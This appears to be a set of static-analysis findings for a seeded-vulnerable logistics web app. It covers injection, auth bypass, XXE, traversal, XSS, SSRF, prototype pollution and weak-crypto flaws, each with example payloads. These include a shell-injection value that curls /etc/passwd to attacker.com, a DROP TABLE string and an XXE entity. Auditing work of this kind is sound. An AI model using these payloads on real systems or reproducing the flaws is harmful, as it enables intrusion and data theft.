extra.message: The /driver-access-assistance endpoint issues a valid JWT for a field worker after checking only that a background-check record with a driverLicenseNumber exists for that worker (`if (!onboardingFile?.driverLicenseNumber)`). The submitted `parsed.data.licenceNumber` value is parsed but never compared against `onboardingFile.driverLicenseNumber`. Anyone who knows a field worker's email can authenticate as that worker by submitting any arbitrary licence number, completely bypassing the intended identity check.

searchJobsAdvanced builds a raw SQL WHERE clause by directly concatenating request-body column names and values (`${col} = '${val}'`) into a query executed via `db.execute(dsql.raw(...))`. A dispatcher/admin-authenticated caller can inject arbitrary SQL through either the column name or the value, e.g. `{"status": "x' OR '1'='1"}` or breaking out via the column key.

searchCustomerDirectory builds a raw SQL query by directly interpolating the `q` (search term) and `sort` query parameters into the SQL string passed to `db.execute(sql.raw(...))`. Both the ILIKE term and the ORDER BY column are fully attacker-controlled, allowing classic SQL injection, e.g. `?sort=1;DROP TABLE customers;--` or `?q=x' UNION SELECT ...--`.

ManifestDoc.find() builds a JavaScript function body from the caller-supplied XPath-like predicate string using `new Function('entry', 'return (' + predicate + ');')`. Because the predicate is constructed directly from the unescaped `x-shipment-code` header value (see routes/routes.ts getRouteManifestEntry, `shipment[@code='${code}']`), an attacker can break out of the string literal to inject and execute arbitrary JavaScript inside the Node process, e.g. header value `x') || (globalThis.process.mainModule && (function(){...})()) || ('`.

getRouteManifestEntry embeds the raw `x-shipment-code` request header directly into an XPath-like predicate string (`shipment[@code='${code}']`) which is evaluated via `new Function` in manifestQuery.ts. The header value is never escaped (contrast with the adjacent getRouteManifestEntrySecure which calls escapeXPathString), allowing an authenticated caller to break out of the string literal and inject arbitrary JS/query logic.

previewShipmentQuote evaluates the `customFormula` query parameter with `new Function('base','weightKg','distanceKm', 'return (' + q.customFormula + ');')` and immediately invokes it. Any authenticated ops_admin/dispatcher caller can supply arbitrary JavaScript as `customFormula`, achieving full code execution in the server process (e.g. reading process.env, calling into Node internals).

convertCustomerStatementFormat builds a shell command string with the unsanitized `format` query parameter interpolated directly (`pandoc ${srcFile} -f html -t ${format} -o ${outFile}`) and runs it via `exec` (which spawns a shell). An authenticated caller can set `?format=pdf; curl attacker.com/$(cat /etc/passwd)` or similar shell metacharacters to execute arbitrary OS commands.

renderReportToPdf builds a shell command string embedding the unvalidated `template` query parameter (`wkhtmltopdf --title "${template}" reports/${template}.html ${outFile}`) and executes it with `spawn(cmd, [], { shell: true })`. An attacker can inject shell metacharacters via `?template=` to execute arbitrary commands, e.g. `template=x" ; touch /tmp/pwned ; echo "`.

searchStaffDirectory embeds the raw `x-search-term` header directly into an LDAP filter string (`(cn=*${term}*)`) without any escaping, unlike findStaffByCorporateEmail which uses escapeFilter.filter(). This allows LDAP filter injection, letting a caller alter the search logic (e.g. injecting `*)(uid=*))(|(cn=*` to widen or bypass the intended filter).

expandEntities() parses DOCTYPE-declared external entities from a carrier-uploaded XML manifest and, for `SYSTEM "path"` declarations, reads the referenced file straight off the local filesystem with `fs.readFileSync(systemPath, 'utf8')`, substituting its content into the parsed document. parseCarrierManifest() (exposed via GET /api/routes/:id/carrier-manifest/items) calls this unconditionally, allowing an attacker who can submit a carrier manifest to read arbitrary local files via a crafted `<!DOCTYPE manifest [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` and referencing `&xxe;` in an `<item>` field, which is then returned in the parsed items response.

fetchManifestExportForLegacyCarrier calls readManifestExportLink(code, { skipSignatureCheck: true }) unconditionally for every request to GET /api/partners/manifest-export/:code, completely disabling HMAC signature verification. Anyone can forge a link by base64url-encoding an arbitrary `{routeId, carrierAccountId, exp}` JSON payload with any suffix after the dot, and retrieve any route's shipment manifest without ever holding a validly signed link.

extra.message: applyRouteSheetCorrection copies every key from the raw request body directly into the DB update patch for a job (`for (const key in fields) { patch[key] = fields[key]; }`) with no field allowlist. A dispatcher can set fields such as `customerId`, `assignedWorkerId`, `status`, or `routeId` directly, bypassing workflow transition rules and job ownership/assignment logic enforced elsewhere.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: resumeJobDraft parses an attacker-supplied JSON blob and spreads it directly into the job insert values (`...draft`) with no schema validation. A dispatcher can set arbitrary columns (e.g. `status: 'completed'`, `createdBy`, or any other job column) that should not be directly settable at creation time.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: importCustomerProfileSnapshot merges the entire raw request body onto the existing customer record via `Object.assign({}, customer, snapshot)` with no field validation, then writes it back. An ops_admin caller can overwrite sensitive fields such as `creditHoldActive`/`creditHoldReason` or `regionId` that are meant to be controlled only through dedicated endpoints.

extra.message: syncKioskJobUpdate merges the entire raw request body onto the job row via `Object.assign({}, job, req.body)` (only stripping `id`) and writes it back with `db.update`. A badged-in kiosk session can set arbitrary job columns — e.g. `customerId`, `assignedWorkerId`, `serviceTypeId`, or `status` — bypassing the workflow transition checks enforced in the normal /jobs/:id/status route.

extra.message: archiveRouteManifest joins the user-supplied `tag` field directly into a filesystem path (`path.join(ARCHIVE_DIR, \`${body.data.tag}.csv\`)`) without sanitizing it with `path.basename` (contrast with the adjacent archiveCompletionDigest which does `path.basename(body.data.tag)`). A dispatcher/admin can supply a tag like `../../../../tmp/evil` to write the CSV file outside ARCHIVE_DIR.

fetchStatementLayoutSource builds a file path from the unsanitized `layout` query parameter (`path.join(STATEMENT_LAYOUT_DIR, layoutName + '.html')`) and reads it with `fs.readFileSync`, returning the contents in the response. A caller can supply `?layout=../../../../etc/passwd%00` (or, since `.html` is appended, any path ending with a directory-traversal sequence to a known `.html` file, e.g. `../../../../some/file` where `.html` is part of a reachable path) to read files outside the intended directory; unlike the adjacent fetchStatementLayoutSourceSafe there is no containment check.

getTrainingMaterial builds a file path from the unsanitized `courseName` URL parameter (`path.join(TRAINING_MATERIALS_DIR, courseName + '.pdf')`) and reads it with `fs.readFileSync`, unlike getTrainingMaterialSafe which applies `path.basename`. A staff caller can supply `courseName=../../../../etc/passwd%00` style traversal sequences to read arbitrary files with a `.pdf` suffix constraint that can often still be bypassed via null-byte-free traversal to reachable files.

replyStagerWidget interpolates the raw, unescaped job message body directly into an HTML string inside a single-quoted JS string literal within an `onclick` attribute (`onclick="...({detail: '${body}'}))"`), and the result is rendered with `v-html` at line 210. Any user able to post a job message (including customers, via POST /api/jobs/:id/messages) can inject a single quote to break out of the JS string and execute arbitrary JavaScript in the browser of any staff/customer viewing the job, e.g. a message body of `'});alert(document.cookie);//`. Contrast with IncidentDetail.vue's summaryStagerWidget, which HTML-attribute-escapes its input before building the same kind of widget.

mergeDeep recursively copies keys from the attacker-controlled `overrides` object onto `target` without excluding `__proto__`, `constructor`, or `prototype`. It is invoked from syncDispatchBoardLayout (misc.ts) with JSON parsed straight from the `x-board-preferences` request header, e.g. `{"__proto__":{"polluted":"yes"}}`. Because `target['__proto__']` resolves to the real Object.prototype, this pollutes the prototype for the entire Node process, potentially affecting authorization/property-existence checks elsewhere in the app. Contrast with the adjacent mergeDeepSafe which filters RESERVED_MERGE_KEYS.

cwe: CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')

extra.message: getKioskRoutePreviewTile fetches whatever URL is stored in the `kiosk_map_provider` cookie with no host allowlist and returns the response body/content-type to the caller. That cookie value is set at boot time directly from the client-supplied `mapProviderUrl` field (bootKioskTerminal, kiosk.ts:18-38) with only URL-format validation, not a host check. This allows server-side request forgery against internal services (e.g. cloud metadata endpoints, internal admin panels) whose response is reflected back to the caller. Contrast with getKioskRoutePreviewTileSafe, which checks the hostname against ALLOWED_MAP_PROVIDER_HOSTS.

completeKioskBadgeInFlow redirects to whatever URL/path is stored in the `next_screen` cookie with no validation. That cookie is set directly from the client-supplied `nextScreen` field in bootKioskTerminal with only an optional-string check, so a terminal/attacker that can influence the boot payload can cause the badge-in flow to redirect to an arbitrary destination. Contrast with completeKioskBadgeInFlowSafe, which restricts the destination to ALLOWED_KIOSK_SCREENS.

openScanCursorCbc decrypts client-supplied cursors with unauthenticated AES-256-CBC and distinguishes a padding failure (`CursorPaddingError`) from other failures. Because resumeManifestScan (routes.ts) surfaces this distinction in its response ('Malformed resume cursor' vs 'Resume cursor could not be read'), an attacker can mount a padding-oracle attack to decrypt or forge cursor ciphertext without knowing CURSOR_KEY. Contrast with the AEAD-based sealScanCursorGcm/openScanCursorGcm pair, which authenticates the ciphertext and collapses all failures to one generic error.

cwe: CWE-353: Missing Support for Integrity Check

extra.message: submitBackgroundCheck stores the field worker's Social Security Number in plaintext (`ssn: parsed.data.ssn`) in the worker_background_checks table (schema.ts: `ssn: text('ssn').notNull()`), while the sibling submitPayoutAccount handler in the same file correctly encrypts bank account numbers at rest via encryptField/AES-256-GCM before storage. Anyone with DB read access (or a future SQL injection elsewhere in the app) can read SSNs in the clear.

cwe: CWE-312: Cleartext Storage of Sensitive Information

extra.message: registerCarrierPortalAccount hashes the carrier portal password with a single unsalted SHA-256 pass (`crypto.createHash('sha256').update(password).digest('hex')`) instead of a slow, salted algorithm. This makes stored password hashes trivially crackable via rainbow tables/GPU brute force if the accounts table is ever exposed. Contrast with onboardCarrierPortalAccount, which uses bcrypt.hash(password, 12).

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort

extra.message: getWallboardStatusFeed sets `Access-Control-Allow-Origin` to the caller-supplied `Origin` request header (or `*`) whenever WALLBOARD_WIDGET_ORIGIN is unset, allowing any website to make cross-origin requests and read the response. Contrast with getWallboardStatusFeedScoped, which only reflects an allow-listed origin (ALLOWED_WALLBOARD_ORIGINS) and adds `Vary: Origin`.

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: getLegacyDispatchBoard is registered with no authentication preHandler (legacyRoutes has no `authenticate` hook, unlike every other route file), so job references, statuses, and priorities are exposed to any unauthenticated caller. The handler additionally strips X-Frame-Options and sets `Content-Security-Policy: frame-ancestors *`, intentionally allowing the response to be framed by any site.

cwe: CWE-306: Missing Authentication for Critical Function

extra.message: renderUploadedStatementTemplate compiles and executes arbitrary, fully attacker/ops-uploaded Handlebars markup (uploadStatementTemplate in data.ts stores raw `content` with no restriction on helpers/expressions). Handlebars templates can reach into JS internals via constructor-access gadgets (e.g. `{{#with this.constructor}}...{{/with}}`), which is a known path to server-side template injection / code execution when template source is not fully trusted.

cwe: CWE-94: Improper Control of Generation of Code ('Code Injection')

extra.message: uploadCarrierPortalLogo saves an uploaded file to the public web-accessible CARRIER_LOGO_PUBLIC_DIR using an extension taken directly from the client-supplied filename, with no MIME-type allowlist and no size cap. An attacker can upload a `.html` or `.svg` file (which browsers may render/execute inline) to a publicly served path, enabling stored XSS. Contrast with uploadCarrierPortalLogoSafe, which enforces ALLOWED_LOGO_MIME, MAX_LOGO_BYTES, and stores the file under a non-public directory with a generated name.

cwe: CWE-434: Unrestricted Upload of File with Dangerous Type
